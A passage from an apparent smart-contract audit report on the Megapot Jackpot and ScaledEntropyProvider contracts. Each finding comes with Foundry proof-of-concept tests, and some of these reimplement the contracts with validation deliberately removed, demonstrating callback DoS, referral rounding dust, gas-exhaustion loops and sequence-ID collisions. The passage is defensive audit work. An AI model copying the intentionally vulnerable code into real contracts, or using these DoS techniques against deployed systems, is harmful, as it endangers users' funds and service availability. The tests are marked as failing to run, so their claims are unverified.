### Finding Confidence Justification: Jackpot.sol isn’t included here to verify explicit guardrails (e.g., enforcing normalBallMax >= 5). The documentation and invariants strongly imply such constraints, but without the concrete setter checks, there is slight uncertainty. Even so, the impact still requires trusted-admin misconfiguration.
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
ScaledEntropyProvider accepts SetRequest arrays after only shallow validation (_validateRequests checks min<=max and samples>0). For no-replacement draws, it does not enforce samples <= (maxRange-minRange+1). During the entropy callback, _getScaledRandomness forwards these params to FisherYatesRejection.draw(), which reverts with 'Too many draws' when violated. This turns an invalid configuration into an asynchronous failure at callback time, causing the consumer's drawing flow to revert and remain locked. Vulnerable snippet:

- _validateRequests():
  if (_requests[i].minRange > _requests[i].maxRange) revert InvalidRange();
  if (_requests[i].samples == 0) revert InvalidSamples();
  // Missing: if !withReplacement then require(samples <= maxRange-minRange+1)

- _getScaledRandomness():
  requestsOutputs[i] = FisherYatesRejection.draw(minRange, maxRange, samples, seed);

A misconfigured request like {minRange:1, maxRange:5, samples:6, withReplacement:false} passes request time checks but reverts in the callback, blocking settlement for the consumer.

## Impact
If a no-replacement SetRequest specifies samples greater than the available range size, entropyCallback reverts with "Too many draws" during scaling. Because the Pyth callback is a one-shot and the revert undoes state changes, the pending request remains and the consumer’s flow never completes. In Megapot, only the trusted Jackpot constructs these requests and uses samples=5 with range [1..normalBallMax] (normalBallMax >= 5 by design). Therefore, this is a misconfiguration-driven DoS risk (governance setting normalBallMax < 5) rather than a permissionless exploit against Jackpot. Impact: a stuck drawing requiring emergency procedures if misconfigured.

## Command to Run Test


## Proof of Concept
- Attacker (or a misconfigured consumer) calls requestAndCallbackScaledRandomness with a no-replacement SetRequest where samples > range size.
- Request is accepted (fees paid), pending entry stored.
- Later, the entropy contract calls back. _getScaledRandomness invokes FisherYatesRejection.draw(), which reverts with 'Too many draws'.
- Callback fails; consumer’s drawing remains locked since settlement logic never runs.
- Pending entry is not cleared (callback reverted), leaving stale storage and a stuck flow.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// Minimal interfaces and library to keep the test self-contained
interface IScaledEntropyProvider {
    struct SetRequest {
        uint8 samples;
        uint256 minRange;
        uint256 maxRange;
        bool withReplacement;
    }
}

interface IEntropyV2 {
    function requestV2(address provider, uint32 gasLimit) external payable returns (uint64 assignedSequenceNumber);
    function getFeeV2(address provider, uint32 gasLimit) external view returns (uint128);
}

library FisherYatesRejection {
    uint256 constant MAX_UINT = type(uint256).max;
    function draw(
        uint256 minRange,
        uint256 maxRange,
        uint256 count,
        uint256 seed
    ) external pure returns (uint256[] memory result) {
        require(count <= maxRange - minRange + 1, "Too many draws");
        uint256 rangeSize = maxRange - minRange + 1;
        uint256[] memory pool = new uint256[](rangeSize);
        for (uint256 i = 0; i < rangeSize; i++) pool[i] = i + minRange;
        uint256 nonce = 0;
        for (uint256 i = rangeSize - 1; i > 0; i--) {
            uint256 rand;
            while (true) {
                rand = uint256(keccak256(abi.encode(seed, nonce)));
                uint256 limit = (MAX_UINT / (i + 1)) * (i + 1);
                if (rand < limit) { rand = rand % (i + 1); break; }
                nonce++;
            }
            (pool[i], pool[rand]) = (pool[rand], pool[i]);
            nonce++;
        }
        result = new uint256[](count);
        for (uint256 j = 0; j < count; j++) result[j] = pool[j];
    }
}

abstract contract IEntropyConsumer {
    function _entropyCallback(
        uint64 sequence,
        address provider,
        bytes32 randomNumber
    ) external {
        address entropy = getEntropy();
        require(entropy != address(0), "Entropy address not set");
        require(msg.sender == entropy, "Only Entropy can call this function");
        entropyCallback(sequence, provider, randomNumber);
    }
    function getEntropy() internal view virtual returns (address);
    function entropyCallback(uint64 sequence, address provider, bytes32 randomNumber) internal virtual;
}

contract ScaledEntropyProvider is IEntropyConsumer {
    struct PendingRequest {
        address callback;
        bytes4 selector;
        bytes context;
        bytes32 userRandomNumber;
        IScaledEntropyProvider.SetRequest[] setRequests;
    }

    error InvalidSelector();
    error InsufficientFee();
    error UnknownSequence();
    error CallbackFailed(bytes4 selector);
    error ZeroAddress();
    error InvalidRequests();
    error InvalidRange();
    error InvalidSamples();

    IEntropyV2 private entropy;
    address private entropyProvider;
    mapping(uint64 => PendingRequest) private pending;

    constructor(address _entropy, address _entropyProvider) {
        if (_entropy == address(0) || _entropyProvider == address(0)) revert ZeroAddress();
        entropy = IEntropyV2(_entropy);
        entropyProvider = _entropyProvider;
    }

    function requestAndCallbackScaledRandomness(
        uint32 _gasLimit,
        IScaledEntropyProvider.SetRequest[] memory _requests,
        bytes4 _selector,
        bytes memory _context
    ) external payable returns (uint64 sequence) {
        if (msg.value < getFee(_gasLimit)) revert InsufficientFee();
        if (_selector == bytes4(0)) revert InvalidSelector();
        _validateRequests(_requests);
        sequence = entropy.requestV2{value: msg.value}(entropyProvider, _gasLimit);
        _storePendingRequest(sequence, _selector, _context, _requests);
    }

    function getFee(uint32 _gasLimit) public view returns (uint256) {
        return entropy.getFeeV2(entropyProvider, _gasLimit);
    }

    function getPendingRequest(uint64 sequence) external view returns (PendingRequest memory) {
        return pending[sequence];
    }

    function entropyCallback(uint64 sequence, address, bytes32 randomNumber) internal override {
        PendingRequest memory req = pending[sequence];
        if (req.callback == address(0)) revert UnknownSequence();
        delete pending[sequence];
        uint256[][] memory scaledRandomNumbers = _getScaledRandomness(randomNumber, req.setRequests);
        (bool success, ) = req.callback.call(abi.encodeWithSelector(req.selector, sequence, scaledRandomNumbers, req.context));
        if (!success) revert CallbackFailed(req.selector);
    }

    function _getScaledRandomness(
        bytes32 _randomNumber,
        IScaledEntropyProvider.SetRequest[] memory _setRequests
    ) internal pure returns (uint256[][] memory requestsOutputs) {
        requestsOutputs = new uint256[][](_setRequests.length);
        for (uint256 i = 0; i < _setRequests.length; i++) {
            if (!_setRequests[i].withReplacement) {
                requestsOutputs[i] = FisherYatesRejection.draw(
                    _setRequests[i].minRange,
                    _setRequests[i].maxRange,
                    _setRequests[i].samples,
                    uint256(_randomNumber)
                );
            } else {
                requestsOutputs[i] = _drawWithReplacement(
                    _setRequests[i].minRange,
                    _setRequests[i].maxRange,
                    _setRequests[i].samples,
                    uint256(_randomNumber)
                );
            }
        }
    }

    function getEntropy() internal view override returns (address) { return address(entropy); }

    function _validateRequests(IScaledEntropyProvider.SetRequest[] memory _requests) internal pure {
        if (_requests.length == 0) revert InvalidRequests();
        for (uint256 i = 0; i < _requests.length; i++) {
            if (_requests[i].minRange > _requests[i].maxRange) revert InvalidRange();
            if (_requests[i].samples == 0) revert InvalidSamples();
            // Missing no-replacement upper bound check (intentional for PoC)
        }
    }

    function _storePendingRequest(
        uint64 sequence,
        bytes4 _selector,
        bytes memory _context,
        IScaledEntropyProvider.SetRequest[] memory _setRequests
    ) internal {
        pending[sequence].callback = msg.sender;
        pending[sequence].selector = _selector;
        pending[sequence].context = _context;
        for (uint256 i = 0; i < _setRequests.length; i++) {
            pending[sequence].setRequests.push(_setRequests[i]);
        }
    }

    function _drawWithReplacement(
        uint256 _minRange,
        uint256 _maxRange,
        uint8 _samples,
        uint256 _randomNumber
    ) internal pure returns (uint256[] memory) {
        uint256[] memory result = new uint256[](_samples);
        uint256 range = _maxRange - _minRange + 1;
        uint256 nonce = 0;
        for (uint256 i = 0; i < _samples; i++) {
            uint256 rand;
            while (true) {
                rand = uint256(keccak256(abi.encode(_randomNumber, nonce)));
                uint256 limit = (type(uint256).max / range) * range;
                if (rand < limit) { result[i] = uint256((rand % range) + _minRange); break; }
                nonce++;
            }
            nonce++;
        }
        return result;
    }
}

interface IEntropyConsumerLike {
    function _entropyCallback(uint64 sequence, address provider, bytes32 randomNumber) external;
}

contract MockEntropyV2 is IEntropyV2 {
    uint64 public nextSeq = 1;
    mapping(uint64 => address) public consumerForSeq;
    function requestV2(address, uint32) external payable returns (uint64 assignedSequenceNumber) {
        assignedSequenceNumber = nextSeq++;
        consumerForSeq[assignedSequenceNumber] = msg.sender;
    }
    function getFeeV2(address, uint32) external view returns (uint128) { return 0; }
    function triggerCallback(uint64 sequence, bytes32 randomNumber) external {
        address consumer = consumerForSeq[sequence];
        require(consumer != address(0), "no consumer");
        IEntropyConsumerLike(consumer)._entropyCallback(sequence, address(this), randomNumber);
    }
}

contract DummyConsumer {
    ScaledEntropyProvider public provider;
    bool public locked;
    constructor(ScaledEntropyProvider _provider) { provider = _provider; }
    function requestBad(uint32 gasLimit) external returns (uint64 seq) {
        locked = true;
        IScaledEntropyProvider.SetRequest[] memory reqs = new IScaledEntropyProvider.SetRequest[](1);
        reqs[0] = IScaledEntropyProvider.SetRequest({
            samples: 6,
            minRange: 1,
            maxRange: 5,
            withReplacement: false
        });
        seq = provider.requestAndCallbackScaledRandomness(gasLimit, reqs, this.onRandomness.selector, "");
    }
    function onRandomness(uint64, uint256[][] memory, bytes memory) external { locked = false; }
}

contract EntropyTooManyDrawsTest is Test {
    MockEntropyV2 mock;
    ScaledEntropyProvider provider;
    DummyConsumer consumer;

    function setUp() public {
        mock = new MockEntropyV2();
        provider = new ScaledEntropyProvider(address(mock), address(0xBEEF));
        consumer = new DummyConsumer(provider);
    }

    function test_DoS_on_callback_due_to_too_many_draws() public {
        uint64 seq = consumer.requestBad(200000);
        vm.expectRevert("Too many draws");
        mock.triggerCallback(seq, bytes32(uint256(123)));
        ScaledEntropyProvider.PendingRequest memory p = provider.getPendingRequest(seq);
        assertEq(p.callback, address(consumer));
        assertTrue(consumer.locked());
    }
}


## Suggested Mitigation
Fail fast in _validateRequests for no-replacement requests. After validating minRange <= maxRange and samples > 0, add: if (!_requests[i].withReplacement) { uint256 range = _requests[i].maxRange - _requests[i].minRange + 1; if (_requests[i].samples > range) revert InvalidSamples(); } This prevents invalid requests from being accepted and avoids asynchronous callback reverts that can leave drawings stuck.





 **Derived From** : Referral distribution rounding dust accumulates and is never credited

## [L-9]. Unassigned remainder in Jackpot referral splitting accumulates as untracked USDC (penny-shaving over time)

### Finding Severity Justification: The code splits referral amounts using integer division and does not reassign the per-referrer rounding remainder, creating tiny dust per purchase/claim (at most < maxReferrers micro-USDC per operation). This does not risk assets or solvency and matches the project’s stated tolerance for rounding dust; impact is negligible and limited to sub-cent amounts accumulating over time.
## Derived From Pattern/Invariant
Referral distribution rounding dust accumulates and is never credited

## Exploit Type
RoundingError

## Location
Jackpot._validateAndTrackReferrals; _payReferrersWinnings

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In Jackpot._validateAndTrackReferrals and _payReferrersWinnings, referral amounts are split with integer division per referrer, but the per-loop floors discard the remainder. The total order-level fee is computed once: referralFeeTotal = ticketsValue * referralFee / 1e18 (or referrerShare = winningAmount * referralWinShare / 1e18). Then each referrer gets referrerFee = referralFeeTotal * split[i] / 1e18 (floored), summed over i. The leftover remainder referralFeeTotal − Σ(referrerFee) is never credited to LPs nor any referrer, leaving untracked USDC inside the Jackpot contract. Over many purchases/claims (especially with many referrers and crafted ticket counts), this dust accumulates and economically underpays referrers (and understates lpEarnings on purchase path). Vulnerable snippets:

- Purchase path:
  referralFeeTotal = _ticketsValue * referralFee / PRECISE_UNIT;
  ... referrerFee = referralFeeTotal * _referralSplit[i] / PRECISE_UNIT; referralFees[referrer] += referrerFee;  // remainder never assigned

- Winnings path:
  referrerShare = _winningAmount * _referralWinShare / PRECISE_UNIT;
  ... referrerFee = referrerShare * referralScheme.referralSplit[i] / PRECISE_UNIT; referralFees[referrer] += referrerFee;  // remainder never assigned

Result: contract USDC balance increases by the full ticketsValue, but the accounted obligations (lpEarnings + ΣreferralFees) are short by the truncation remainder each time.

## Impact
The per-referrer integer-division floors leave an unassigned remainder on both purchase and winnings referral paths. This remainder is not added to referrers, not to lpEarnings, and has no dedicated sink, causing persistent underpayment (referrers on both paths and LPs on purchase path) and accumulation of trapped USDC in the contract. Over time, this creates a small but growing balance drift that cannot be claimed by anyone, breaking strict accounting equality (contract balance > tracked obligations).

## Command to Run Test


## Proof of Concept
Deterministic remainder with 2 referrers: choose referral splits [1e18 - 1, 1] (both non-zero and summing to 1e18). Let referralFeeTotal = T = ticketsValue * referralFee / 1e18. Because T << 1e18, floor(T * (1e18 - 1) / 1e18) = T - 1 and floor(T * 1 / 1e18) = 0. Hence Σ paid = (T - 1) + 0 = T - 1 and the unassigned dust is exactly 1 (in USDC’s smallest unit) for every order using this scheme, regardless of number of tickets in the order. On the purchase path, lpEarnings is reduced by T while only T - 1 is actually credited to referrers; the missing 1 remains untracked in the contract. The same effect exists on the winnings referral split path.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Jackpot} from "contracts/Jackpot.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IPayoutCalculator} from "contracts/interfaces/IPayoutCalculator.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockUSDC is IERC20 {
    string public name = "MockUSDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
}

contract DummyPayoutCalc is IPayoutCalculator {
    function calculateAndStoreDrawingUserWinnings(
        uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory
    ) external pure returns (uint256) { return 0; }
    function setDrawingTierInfo(uint256) external {}
    function getTierPayout(uint256, uint256) external pure returns (uint256) { return 0; }
}

contract DummyEntropy is IScaledEntropyProvider {
    function requestAndCallbackScaledRandomness(
        uint32, SetRequest[] memory, bytes4, bytes memory
    ) external payable returns (uint64) { return 0; }
    function getFee(uint32) external view returns (uint256) { return 0; }
}

contract ReferralRemainderDustTest is Test {
    MockUSDC usdc;
    Jackpot jackpot;
    JackpotLPManager lpManager;
    JackpotTicketNFT nft;
    DummyPayoutCalc payout;
    DummyEntropy entropy;

    address lp = address(0xBEEF);
    address buyer = address(0xB0B);

    uint256 constant PRECISE_UNIT = 1e18;

    function setUp() public {
        usdc = new MockUSDC();
        entropy = new DummyEntropy();
        payout = new DummyPayoutCalc();

        uint256 drawingDurationInSeconds = 3600;
        uint8 normalBallMax = 35;
        uint8 bonusballMin = 2;
        uint256 lpEdgeTarget = 25e16;        // 25%
        uint256 reserveRatio = 20e16;        // 20%
        uint256 referralFee = 10e16;         // 10%
        uint256 referralWinShare = 5e16;     // 5%
        uint256 protocolFee = 2e16;          // 2%
        uint256 protocolFeeThreshold = 0;
        uint256 ticketPrice = 1_000_000;     // 1 USDC (6 decimals)
        uint256 maxReferrers = 64;
        uint32 entropyBaseGasLimit = 500000;

        jackpot = new Jackpot(
            drawingDurationInSeconds,
            normalBallMax,
            bonusballMin,
            lpEdgeTarget,
            reserveRatio,
            referralFee,
            referralWinShare,
            protocolFee,
            protocolFeeThreshold,
            ticketPrice,
            maxReferrers,
            entropyBaseGasLimit
        );

        lpManager = new JackpotLPManager(jackpot);
        nft = new JackpotTicketNFT(jackpot);
        jackpot.initialize(IERC20(address(usdc)), lpManager, nft, entropy, payout);
        jackpot.initializeLPDeposits(1_000_000_000_000_000);

        // Seed LP and deposit
        usdc.mint(lp, 100_000_000_000_000);
        vm.startPrank(lp);
        usdc.approve(address(jackpot), type(uint256).max);
        jackpot.lpDeposit(10_000_000_000_000);
        vm.stopPrank();

        // Start first drawing
        jackpot.initializeJackpot(block.timestamp + 1);
    }

    function test_DeterministicReferralRemainder_DustAccumulates() public {
        // 2-referrer scheme: [1e18 - 1, 1] guarantees 1 unit of dust for any T << 1e18
        address[] memory refs = new address[](2);
        refs[0] = address(0x1111);
        refs[1] = address(0x2222);
        uint256[] memory splits = new uint256[](2);
        splits[0] = PRECISE_UNIT - 1; // non-zero
        splits[1] = 1;                // non-zero, sums to 1e18

        // Buy K tickets (any K > 0). Referral dust will be exactly 1 (micro-USDC) for the whole order
        uint256 K = 7;
        IJackpot.Ticket[] memory tickets = new IJackpot.Ticket[](K);
        for (uint256 i = 0; i < K; i++) {
            uint8[] memory normals = new uint8[](5);
            normals[0] = 1; normals[1] = 2; normals[2] = 3; normals[3] = 4; normals[4] = 5;
            tickets[i] = IJackpot.Ticket({ normals: normals, bonusball: 1 });
        }

        uint256 ticketPrice = jackpot.ticketPrice();
        uint256 ticketsValue = ticketPrice * K;
        usdc.mint(buyer, ticketsValue);
        vm.startPrank(buyer);
        usdc.approve(address(jackpot), ticketsValue);

        uint256 preBal = usdc.balanceOf(address(jackpot));
        uint256 drawingId = jackpot.currentDrawingId();
        Jackpot.DrawingState memory pre = jackpot.getDrawingState(drawingId);

        uint256 ref0Pre = jackpot.referralFees(refs[0]);
        uint256 ref1Pre = jackpot.referralFees(refs[1]);

        jackpot.buyTickets(tickets, buyer, refs, splits, bytes32("src"));
        vm.stopPrank();

        Jackpot.DrawingState memory post = jackpot.getDrawingState(drawingId);
        uint256 postBal = usdc.balanceOf(address(jackpot));

        uint256 ref0Post = jackpot.referralFees(refs[0]);
        uint256 ref1Post = jackpot.referralFees(refs[1]);

        uint256 lpEarnDelta = post.lpEarnings - pre.lpEarnings;
        uint256 sumRefDelta = (ref0Post - ref0Pre) + (ref1Post - ref1Pre);

        uint256 referralFeeTotal = (ticketsValue * jackpot.referralFee()) / PRECISE_UNIT; // T
        uint256 dust = referralFeeTotal - sumRefDelta;

        // Assertions
        assertEq(postBal - preBal, ticketsValue, "USDC in must equal ticketsValue");
        assertEq(dust, 1, "Deterministic 1-unit dust due to splits [1e18-1, 1]");
        uint256 accounted = lpEarnDelta + sumRefDelta;
        assertEq(ticketsValue - accounted, dust, "Dust equals shortfall in accounted obligations");
    }
}


## Suggested Mitigation
Ensure Σ distributed == total by assigning the rounding remainder after the loop. For purchase path in _validateAndTrackReferrals: keep a running sum of allocated = Σ(referralFeeTotal * split[i] / 1e18); after the loop compute remainder = referralFeeTotal - allocated; credit remainder to a chosen recipient (e.g., the first referrer) and emit an event. For winnings path in _payReferrersWinnings when a scheme exists: do the same with referrerShare, allocating the remainder to the first referrer. Optionally, to reduce bias, use a largest-remainder method: track per-referrer fractional parts and assign the remainder to the highest fractional part(s). If you prefer not to tilt toward referrers on purchases, you could alternatively credit the remainder to lpEarnings on the purchase path, but then winners’ path should still assign the remainder to a referrer to keep winner splits exact. Example pattern:

- Compute per-ref fee: fee_i = (total * split[i]) / 1e18; allocated += fee_i; credit(ref[i], fee_i)
- After loop: remainder = total - allocated; if (remainder > 0) credit(ref[0], remainder)

This removes trapped USDC and maintains exact accounting equality.





 **Derived From** : Unbounded iteration over user-owned tickets can cause gas-based DoS for on-chain callers

## [L-10]. Unbounded loop with external call in JackpotTicketNFT.getUserTickets enables gas-based DoS against integrators

### Finding Severity Justification: The loop in JackpotTicketNFT.getUserTickets is unbounded and performs an external view call per iteration, which can exhaust gas for on-chain callers. However, it is a read-only helper not used in any protocol-critical path, does not risk assets or protocol solvency, and the DoS only materializes if an integrator chooses to call this unpaginated view on-chain. Per Code4rena guidelines, unbounded iteration in non-critical view helpers is QA/Low at best.
## Derived From Pattern/Invariant
Unbounded iteration over user-owned tickets can cause gas-based DoS for on-chain callers

## Exploit Type
GasGriefBlockLimit

## Location
JackpotTicketNFT.getUserTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
JackpotTicketNFT.getUserTickets iterates i=0..userTickets[_user][_drawingId].totalTicketsBought to build a dynamic array of ExtendedTrackedTicket. The loop bound is fully user-controlled via the number of tickets purchased for that user/drawing, and each iteration performs an external call through _getExtendedTicketInfo -> jackpot.getUnpackedTicket(...). An attacker can purchase an arbitrarily large number of tickets and then cause on-chain integrators that query this function to run out of gas and revert (STATICCALL gas exhaustion), effectively DoS-ing that integrator path. Vulnerable snippet:

function getUserTickets(address _userAddress, uint256 _drawingId) external view returns (ExtendedTrackedTicket[] memory) {
    UserTickets storage userDrawingTickets = userTickets[_userAddress][_drawingId];
    ExtendedTrackedTicket[] memory userTicketsList = new ExtendedTrackedTicket[](userDrawingTickets.totalTicketsBought);
    for (uint256 i = 0; i < userDrawingTickets.totalTicketsBought; i++) {
        uint256 ticketId = userDrawingTickets.ticketIds[i];
        userTicketsList[i] = _getExtendedTicketInfo(ticketId); // external call inside loop
    }
    return userTicketsList;
}

## Impact
Functional DoS for any on-chain integrator relying on this view; attacker can bloat ticket count for a user/drawing so integrator calls revert from gas exhaustion (array allocation + per-item external calls), breaking integrations such as routers, managers, or on-chain indexers.

## Command to Run Test


## Proof of Concept
1) Attacker buys many tickets for a single drawing, inflating userTickets[attacker][drawingId].totalTicketsBought.
2) An on-chain integrator contract calls JackpotTicketNFT.getUserTickets(attacker, drawingId) to enumerate tickets.
3) The call must allocate a large memory array and loop over all elements, performing an external call per element. With typical gas constraints, the STATICCALL runs out of gas and reverts, causing persistent DoS for that call path.
4) The attacker can keep increasing tickets to keep the integrator bricked.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";

contract MockJackpot is IJackpot {
    function buyTickets(Ticket[] memory, address, address[] memory, uint256[] memory, bytes32) external returns (uint256[] memory) { uint256[] memory r; return r; }
    function claimWinnings(uint256[] memory) external {}
    function ticketPrice() external pure returns (uint256) { return 1e6; }
    function currentDrawingId() external pure returns (uint256) { return 1; }
    function getUnpackedTicket(uint256, uint256) external pure returns (uint8[] memory normals, uint8 bonusball) {
        normals = new uint8[](5);
        normals[0]=1; normals[1]=2; normals[2]=3; normals[3]=4; normals[4]=5;
        bonusball = 1;
    }
}

contract GasProxy {
    function callWithGas(address target, bytes calldata data, uint256 gasLimit) external returns (bool success, bytes memory ret) {
        (success, ret) = target.call{gas: gasLimit}(data);
    }
}

contract GetUserTickets_UnboundedLoop_DoS_Test is Test {
    MockJackpot mk;
    JackpotTicketNFT nft;
    GasProxy proxy;
    address attacker = address(0xA11CE);

    function setUp() public {
        mk = new MockJackpot();
        nft = new JackpotTicketNFT(IJackpot(address(mk)));
        proxy = new GasProxy();
    }

    function test_DoS_GetUserTickets_OOG() public {
        uint256 drawingId = 1;
        uint256 N = 150; // enough to blow up low-gas call but succeed with high gas
        for (uint256 i = 0; i < N; i++) {
            vm.prank(address(mk));
            nft.mintTicket(attacker, i + 1, drawingId, 0, bytes32(0));
        }

        bytes memory data = abi.encodeWithSelector(JackpotTicketNFT.getUserTickets.selector, attacker, drawingId);

        // Expect failure (out of gas / revert) under tight gas
        (bool okLow, ) = proxy.callWithGas(address(nft), data, 100_000);
        assertEq(okLow, false, "Expected low-gas call to fail due to unbounded loop + external calls");

        // With abundant gas it should succeed, proving gas-dependent DoS vector
        (bool okHigh, ) = proxy.callWithGas(address(nft), data, 25_000_000);
        assertEq(okHigh, true, "High-gas call should succeed for the same input");
    }
}


## Suggested Mitigation
- Do not expose unbounded, per-item external-call loops for on-chain use. Provide bounded/paginated variants:
  - getUserTicketsSlice(user, drawingId, start, limit) and/or getUserTicketIdsSlice(...) plus getUserTicketsCount(user, drawingId) so integrators can page safely.
  - Prefer returning IDs and packed data only to avoid per-item external calls; let callers unpack off-chain or invoke a bounded batch unpack.
- If extended info is required, add a bounded method on Jackpot (or a pure library call with required params) to batch-unpack a limited set of tickets by IDs.
- Optionally document getUserTickets as off-chain only, or enforce a sane upper bound (revert if totalTicketsBought exceeds a configured pagination limit) to prevent accidental on-chain DoS.





 **Derived From** : Provider change can corrupt pending randomness due to per-provider sequence collisions

## [M-11]. Provider switch reuses sequence IDs across providers, overwriting pending[sequence] → wrong callback delivery and DoS (UnknownSequence) in ScaledEntropyProvider.setEntropyProvider

### Finding Severity Justification: Switching entropy providers while there is an outstanding request can cause sequence ID collisions because ScaledEntropyProvider keys pending requests only by sequence, not by (provider, sequence). This enables overwriting of a pending entry, misrouting the randomness to the wrong consumer and causing UnknownSequence() on the legitimate callback. Impact: protocol liveness and correctness of randomness delivery are compromised and can force emergency mode. No direct asset theft, but availability and integrity are affected.
## Derived From Pattern/Invariant
Provider change can corrupt pending randomness due to per-provider sequence collisions

## Exploit Type
AccountingInvariantViolation

## Location
ScaledEntropyProvider.setEntropyProvider

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
IEntropyV2 sequence numbers are per-provider, but ScaledEntropyProvider keys pending requests only by sequence and ignores the provider everywhere, including in entropyCallback. If the owner calls setEntropyProvider while there are pending requests, the new provider may assign the same sequence as an old pending one. _storePendingRequest then overwrites pending[sequence] with the new caller’s data. When the old provider reveals, entropyCallback reads the overwritten entry and delivers randomness to the wrong callback; later the new provider’s reveal reverts with UnknownSequence(). This violates sequence-domain monotonicity and breaks liveness/correctness without any misuse by the admin.

Vulnerable snippets:
- mapping(uint64 => PendingRequest) private pending;
- function setEntropyProvider(address _entropyProvider) external onlyOwner { ... entropyProvider = _entropyProvider; }
- function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override { PendingRequest memory req = pending[sequence]; if (req.callback == address(0)) revert UnknownSequence(); delete pending[sequence]; ... }
- function requestAndCallbackScaledRandomness(...) { sequence = entropy.requestV2{value: msg.value}(entropyProvider, _gasLimit); _storePendingRequest(sequence, ...); }

## Impact
Switching the entropy provider while there are pending requests can corrupt pending mappings because they are keyed only by sequence. Since sequence numbers are per-provider in IEntropyV2, the next request after a provider switch may reuse a sequence already in use by the old provider. The new request overwrites pending[sequence], so when the old provider fulfills, the callback is executed with the wrong stored data (potentially wrong consumer or wrong context/requests). When the new provider later fulfills the same sequence, the contract reverts with UnknownSequence(), breaking liveness. Even if there is only a single consumer (e.g., Jackpot), the overwrite still causes the old fulfillment to consume the new request’s storage and parameters, and the new fulfillment then reverts, leaving the system stuck and wasting paid entropy fees. This undermines correctness and availability without direct asset theft.

## Command to Run Test


## Proof of Concept
Omitted

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";

contract MockEntropy {
    struct Req { address consumer; address provider; uint32 gasLimit; }
    mapping(address => uint64) public seq;
    mapping(address => mapping(uint64 => Req)) public reqs;

    function getFeeV2(address, uint32) external pure returns (uint128) { return 0; }

    function requestV2(address provider, uint32 gasLimit) external payable returns (uint64 assignedSequenceNumber) {
        assignedSequenceNumber = ++seq[provider];
        reqs[provider][assignedSequenceNumber] = Req({consumer: msg.sender, provider: provider, gasLimit: gasLimit});
    }

    // Reveal that requires callback success (use for the first fulfill)
    function reveal(address provider, uint64 sequence, bytes32 randomNumber) external {
        Req memory r = reqs[provider][sequence];
        require(r.consumer != address(0), "no request");
        (bool ok, ) = r.consumer.call(abi.encodeWithSignature("_entropyCallback(uint64,address,bytes32)", sequence, provider, randomNumber));
        require(ok, "callback failed");
    }

    // Reveal that bubbles the consumer revert so tests can match the exact error
    function revealBubble(address provider, uint64 sequence, bytes32 randomNumber) external {
        Req memory r = reqs[provider][sequence];
        require(r.consumer != address(0), "no request");
        (bool ok, bytes memory ret) = r.consumer.call(abi.encodeWithSignature("_entropyCallback(uint64,address,bytes32)", sequence, provider, randomNumber));
        if (!ok) {
            assembly {
                revert(add(ret, 0x20), mload(ret))
            }
        }
    }
}

contract DummyConsumer {
    bool public called;
    uint64 public calledSeq;
    address public caller;

    function makeRequest(ScaledEntropyProvider sep, uint32 gasLimit) external returns (uint64) {
        IScaledEntropyProvider.SetRequest[] memory reqs = new IScaledEntropyProvider.SetRequest[](1);
        reqs[0] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 1, withReplacement: true});
        return sep.requestAndCallbackScaledRandomness(gasLimit, reqs, this.onRandom.selector, bytes(""));
    }

    function onRandom(uint64 sequence, uint256[][] memory, bytes memory) external {
        called = true;
        calledSeq = sequence;
        caller = msg.sender;
    }
}

contract ScaledEntropyProvider_Monotonicity_Test is Test {
    ScaledEntropyProvider sep;
    MockEntropy entropy;
    DummyConsumer c1;
    DummyConsumer c2;
    address providerA = address(0xA);
    address providerB = address(0xB);

    function setUp() public {
        entropy = new MockEntropy();
        sep = new ScaledEntropyProvider(address(entropy), providerA);
        c1 = new DummyConsumer();
        c2 = new DummyConsumer();
    }

    function testProviderSwitchSequenceCollision() public {
        // C1 requests with provider A -> seqA = 1
        vm.prank(address(c1));
        uint64 s1 = c1.makeRequest(sep, 100000);
        assertEq(s1, 1);

        // Switch to provider B (owner is this test contract)
        sep.setEntropyProvider(providerB);

        // C2 requests with provider B -> seqB = 1 (same sequence id)
        vm.prank(address(c2));
        uint64 s2 = c2.makeRequest(sep, 100000);
        assertEq(s2, 1);

